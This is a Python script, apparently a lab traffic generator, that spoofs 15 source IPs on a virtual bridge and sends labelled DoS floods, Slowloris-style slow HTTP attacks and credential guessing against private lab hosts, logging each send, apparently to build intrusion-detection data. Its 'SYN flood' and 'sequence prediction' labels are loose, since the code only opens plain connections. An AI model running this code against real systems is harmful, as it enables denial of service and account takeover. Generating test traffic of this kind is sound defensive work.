#!/usr/bin/env python3
"""全攻击流量（9 种攻击）— curl/nc + asyncio，通过 --interface/-s 绑定源 IP"""

import asyncio
import random
import subprocess
import time

IFACE   = "virbr-k8s"
SRC_IPS = [f"192.168.100.{n}" for n in range(170, 185)]

HTTP_DST, HTTP_PORT = "192.168.100.210", 8080
TCP_TARGETS = [("192.168.100.211", 3306), ("192.168.100.212", 21)]

DURATION = 90
N        = 20


def _log(src, dst, port, atype):
    print(f"SEND|attack|{src}|{dst}|{port}|{atype}|{time.time():.3f}", flush=True)


def manage_ips(action):
    for ip in SRC_IPS:
        subprocess.run(["sudo", "ip", "addr", action, f"{ip}/24", "dev", IFACE],
                       capture_output=True)


def _fire(pending: set, coro):
    task = asyncio.create_task(coro)
    pending.add(task)
    task.add_done_callback(pending.discard)


async def _curl(src, url, extra_args=()):
    proc = await asyncio.create_subprocess_exec(
        "curl", "-s", "--interface", src, "--max-time", "3", *extra_args, url,
        stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL,
    )
    await proc.wait()


async def _curl_post(src, url, data, timeout="3"):
    proc = await asyncio.create_subprocess_exec(
        "curl", "-s", "--interface", src, "--max-time", timeout,
        "-X", "POST", "-d", data, url,
        stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL,
    )
    await proc.wait()


async def _nc_tcp(src, dst, port, wait="2"):
    proc = await asyncio.create_subprocess_exec(
        "nc", "-w", wait, "-s", src, dst, str(port),
        stdin=asyncio.subprocess.DEVNULL,
        stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL,
    )
    await proc.wait()


async def dos_syn(stop: asyncio.Event, pending: set):
    targets = [("192.168.100.210", 8080), ("192.168.100.211", 3306), ("192.168.100.212", 21)]
    while not stop.is_set():
        src = random.choice(SRC_IPS)
        dst, port = random.choice(targets)
        _log(src, dst, port, "Dos-TCP SYN flood")
        _fire(pending, _nc_tcp(src, dst, port, wait="1"))
        await asyncio.sleep(0.01)


async def dos_get(stop: asyncio.Event, pending: set):
    while not stop.is_set():
        src = random.choice(SRC_IPS)
        _log(src, HTTP_DST, HTTP_PORT, "DoS Get")
        _fire(pending, _curl(src, f"http://{HTTP_DST}:{HTTP_PORT}/", ("--max-time", "1")))
        await asyncio.sleep(0.01)


async def ddos_syn(stop: asyncio.Event, pending: set):
    targets = [("192.168.100.210", 8080), ("192.168.100.211", 3306),
               ("192.168.100.212", 21), ("192.168.100.213", 9999)]
    while not stop.is_set():
        src = random.choice(SRC_IPS)
        dst, port = random.choice(targets)
        _log(src, dst, port, "ddos-TCP SYN flood")
        _fire(pending, _nc_tcp(src, dst, port, wait="1"))
        await asyncio.sleep(0.01)


async def tcp_seq(stop: asyncio.Event, pending: set):
    targets = [("192.168.100.210", 8080), ("192.168.100.211", 3306)]
    while not stop.is_set():
        src = random.choice(SRC_IPS)
        dst, port = random.choice(targets)
        _log(src, dst, port, "TCP sequence prediction")
        _fire(pending, _nc_tcp(src, dst, port))
        await asyncio.sleep(0.05)


async def slowloris(stop: asyncio.Event, pending: set):
    while not stop.is_set():
        src = random.choice(SRC_IPS)
        _log(src, HTTP_DST, HTTP_PORT, "Slowloris")
        _fire(pending, _curl(src, f"http://{HTTP_DST}:{HTTP_PORT}/",
                             ("-H", "X-Padding: " + "a" * 512, "--max-time", "30")))
        await asyncio.sleep(0.1)


async def slow_body(stop: asyncio.Event, pending: set):
    while not stop.is_set():
        src = random.choice(SRC_IPS)
        _log(src, HTTP_DST, HTTP_PORT, "Slow-body")
        _fire(pending, _curl_post(src, f"http://{HTTP_DST}:{HTTP_PORT}/upload",
                                  "A" * 4096, timeout="30"))
        await asyncio.sleep(0.1)


async def slow_read(stop: asyncio.Event, pending: set):
    while not stop.is_set():
        src = random.choice(SRC_IPS)
        _log(src, HTTP_DST, HTTP_PORT, "Slow-read")
        _fire(pending, _curl(src, f"http://{HTTP_DST}:{HTTP_PORT}/",
                             ("--max-time", "30", "--limit-rate", "1")))
        await asyncio.sleep(0.1)


async def slow_range(stop: asyncio.Event, pending: set):
    while not stop.is_set():
        src = random.choice(SRC_IPS)
        s, e = random.randint(0, 100), random.randint(101, 200)
        _log(src, HTTP_DST, HTTP_PORT, "Slow-range")
        _fire(pending, _curl(src, f"http://{HTTP_DST}:{HTTP_PORT}/",
                             ("-H", f"Range: bytes={s}-{e}", "--max-time", "30")))
        await asyncio.sleep(0.1)


async def creds(stop: asyncio.Event, pending: set):
    users = ["admin", "root", "user", "guest"]
    pwds  = ["123456", "password", "admin123"]
    while not stop.is_set():
        src = random.choice(SRC_IPS)
        u, p = random.choice(users), random.choice(pwds)
        _log(src, HTTP_DST, HTTP_PORT, "Credentials hijacking")
        _fire(pending, _curl_post(src, f"http://{HTTP_DST}:{HTTP_PORT}/login",
                                  f"username={u}&password={p}"))
        await asyncio.sleep(0.01)


async def main():
    manage_ips("add")
    await asyncio.sleep(0.3)
    print(f"[simulate_3] 全攻击流量开始  N={N}/type  duration={DURATION}s", flush=True)

    stop    = asyncio.Event()
    pending: set = set()

    workers = (
        [asyncio.create_task(dos_syn(stop, pending))   for _ in range(N)] +
        [asyncio.create_task(dos_get(stop, pending))   for _ in range(N)] +
        [asyncio.create_task(ddos_syn(stop, pending))  for _ in range(N)] +
        [asyncio.create_task(tcp_seq(stop, pending))   for _ in range(N)] +
        [asyncio.create_task(slowloris(stop, pending)) for _ in range(N)] +
        [asyncio.create_task(slow_body(stop, pending)) for _ in range(N)] +
        [asyncio.create_task(slow_read(stop, pending)) for _ in range(N)] +
        [asyncio.create_task(slow_range(stop, pending))for _ in range(N)] +
        [asyncio.create_task(creds(stop, pending))     for _ in range(N)]
    )
    await asyncio.sleep(DURATION)
    stop.set()
    await asyncio.gather(*workers, return_exceptions=True)
    if pending:
        await asyncio.gather(*pending, return_exceptions=True)

    manage_ips("del")
    print("[simulate_3] 完成", flush=True)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        manage_ips("del")
